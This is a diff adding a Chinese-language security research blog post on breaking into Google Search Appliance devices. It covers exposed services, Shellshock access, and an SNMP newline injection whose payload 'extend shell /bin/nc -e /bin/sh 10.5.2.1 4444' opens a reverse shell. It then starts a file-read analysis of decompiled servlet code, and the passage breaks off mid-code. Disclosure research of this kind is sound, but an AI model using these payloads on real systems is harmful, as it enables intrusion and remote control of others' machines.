+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;整理出來實際可存取的TCP 攻擊面：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;通訊埠&lt;/th&gt;
+      &lt;th&gt;服務名稱&lt;/th&gt;
+      &lt;th&gt;程式執行檔所在位置&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;22&lt;/td&gt;
+      &lt;td&gt;ssh&lt;/td&gt;
+      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;7800&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;4430&lt;/td&gt;
+      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;19900&lt;/td&gt;
+      &lt;td&gt;feedergate&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8000&lt;/td&gt;
+      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
+      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;8443&lt;/td&gt;
+      &lt;td&gt;stunnel&lt;/td&gt;
+      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;而我們發現  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; 中的字串可以用來解密所有 install_bundle 的內容！
+使用 CVE-2014-6271 取得權限加上可以解出 install bundle 中的內容後，對 vGSA 的研究就暫時告一段落，
+其執行環境中記憶體的保護較為缺少，可能有機會存在弱點並利用：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;
+
+&lt;p&gt;安裝設備後嘗試更改開機順序，但發現進入BIOS需要密碼，且磁碟介面卡的管理介面中 Dell H700 僅有部分功能可以操作：
+&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接著嘗試直接讀取硬碟內容，如果硬碟內容沒有加密，有機會能直接取得設備作業系統及軟體。
+我們發現其硬碟使用SAS 介面進行傳輸，嘗試前還需購買SAS 卡，本次測試使用LSI 9211-8i 進行連結：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;連接嘗試讀取後發現到這是一個自我加密 SED 磁碟，需要密碼unlock 才能存取，OSSLab 這邊有更詳細的解釋：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (中文)&lt;/p&gt;
+
+&lt;p&gt;在無法直接存取硬碟的情況下有幾種方式可以繼續嘗試：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;嘗試讀出於BIOS EEPROM 中的密碼，並更改開機順序&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;此方式需要破壞主機板，有一定風險，於軟體層找不到漏洞才會使用此種方式。
+可參考這篇研究 &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt; (英文)&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;使用 PCILeech 讀取、寫入記憶體並取得系統權限&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;此方式需要特定PCI-e 設備，當時還沒有準備此類設備。可以參考這個 github 專案：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;尋找可存取服務之軟體漏洞&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;此方式較為簡單可行。&lt;/p&gt;
+
+&lt;h4 id=&quot;管理介面換行字元插入&quot;&gt;管理介面換行字元插入&lt;/h4&gt;
+
+&lt;p&gt;登入管理介面後，觀察到其中有 SNMP 取得系統資訊的功能，
+且此功能可以插入自定義字串：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;這邊嘗試經典的換行注入：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;將 sysContact 插入&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extend shell /bin/nc -e /bin/sh 10.5.2.1 4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;插入 extend 設定值之後，就可以用 snmpwalk 觸發 SNMP 的extend 功能，
+並執行 shell。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;成功執行指令並反連。&lt;/p&gt;
+
+&lt;h4 id=&quot;任意讀檔&quot;&gt;任意讀檔&lt;/h4&gt;
+
+&lt;p&gt;於 GSA 6.x 系列版本後的 RPM 安裝包中發現其 80/443 的網頁服務使用 Apache httpd，
+其中位於 /etc/httpd/conf.d/ 中有許多的設定。
+而其中 gsa-http.conf 及 gsa-https.conf 可以發現某些目錄會被導向至本機特定的服務：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  RewriteEngine on
+  RewriteRule ^/security-manager/(.*) http://localhost:7886/security-manager/$1 [P,L]
+  RewriteRule ^/d██████████/(.*) http://localhost:7890/dps/d██████████/$1 [P,L]
+  RewriteRule ^/s██████/(.*) http://localhost:7890/dps/s██████/$1 [P,L]
+  RewriteRule ^/v█████/(.*) http://localhost:7890/v█████/$1 [P,L]
+  RewriteRule ^/$ http://localhost:7800/ [P,L]
+  RewriteRule ^/(.*) http://localhost:7800/$1 [P,L]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;其中通訊埠為 7886 跟 7890 的服務為另外執行的 Apache Tomcat 伺服器，當串接兩層以上的網站伺服器時，
+Tomcat 的路徑判斷 ..;/ 是一個有趣的測試點，可以參閱一位老前輩的文章：&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&quot;&gt;https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;而我們有興趣的點為 dps ，這似乎沒有在舊版的 GSA 中看到。
+從 dps.war 中解出 /WEB-INF/web.xml 觀察網頁應用配置，並發現 /font 會呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-class&amp;gt;&lt;/span&gt;com.documill.dps.connector.servlet.user.DPSDownloadServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;init-param&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;rootDirectory&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;work/fonts/&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/init-param&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;
+
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;font&lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/font/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;接著查看 DPSDownloadServlet：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.documill.dps.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;java.io.*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;javax.servlet.ServletContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSDownloadServlet&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DownloadServlet&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;implements&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSUserService&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DPSDownloadServlet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getRealPath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;ServletContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;servletcontext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;no&quot;&gt;DPS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;DPSSingleton&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getDPS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getHomeDir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;FileNotFoundException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DPSDownloadServlet:getRealPath:DPS home directory not specified&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getAbsolutePath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialVersionUID&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;發現此類別是繼承自 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.davisor.net.servlet.DownloadServlet&lt;/code&gt;，跟進此類別：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpServletResponse&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;kd&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;IOException&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;httpservletrequest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParameter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uriParameterName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isValid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Invalid file path: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;nc&quot;&gt;File&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rootDirectory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;deriveFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;isFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;httpservletresponse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sendError&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;StringBuilder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;No file:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;canRead&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
